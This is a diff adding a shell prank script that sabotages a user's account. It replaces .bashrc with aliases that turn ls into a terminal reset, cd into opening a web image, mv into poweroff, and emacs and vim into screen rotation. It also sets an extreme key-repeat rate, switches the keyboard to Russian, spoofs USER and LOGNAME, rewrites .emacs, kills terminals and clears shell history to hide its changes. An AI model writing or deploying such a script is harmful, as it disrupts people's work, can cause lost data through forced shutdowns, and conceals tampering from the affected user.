@@ -1,0 +1,27 @@
+#!/bin/sh
+mv /home/${USER}/.bashrc /home/${USER}/.snow
+cp /home/${USER}/.Xdefaults /home/${USER}/.Xsnow
+cp /home/${USER}/.emacs /home/${USER}/.oldemacs
+touch /home/${USER}/.bashrc
+echo "#! /bin/sh
+declare -a arr=(\"white\" \"blue1\" \"red2\" \"yellow2\" \"purple\")
+for i in \"\${arr[@]}\"; do
+terminal -bg \$i&
+done" > /home/${USER}/.annoyingTerms && chmod 755 /home/${USER}/.annoyingTerms
+echo "alias ls='reset && echo \"You know nothing, Jon Snow.\" && sleep 10'" >> /home/${USER}/.bashrc;
+echo "alias cd='firefox jeansarda.com/public/ygrow.jpg' && cd" >> /home/${USER}/.bashrc;
+echo "alias mv='poweroff'" >> /home/${USER}/.bashrc;
+echo "alias emacs='xrandr -o left'" >> /home/${USER}/.bashrc;
+echo "alias vim='xrandr -o right'" >> /home/${USER}/.bashrc;
+echo "xset r rate 3;" >> /home/${USER}/.bashrc;
+echo "(set-face-background 'default \"pink\")" >> /home/${USER}/.emacs;
+echo "(set-face-foreground 'default \"lightblue\")" >> /home/${USER}/.emacs;
+echo "history -c" >> /home/${USER}/.bashrc;
+echo "PS1=snow_j@YouKnowNothingJohnSnow$" >> /home/${USER}/.bashrc;
+xset b 100 2000 1500
+export USER=snow_j
+export LOGNAME=snow_j
+
+setxkbmap ru;
+history -c
+pkill terminal;
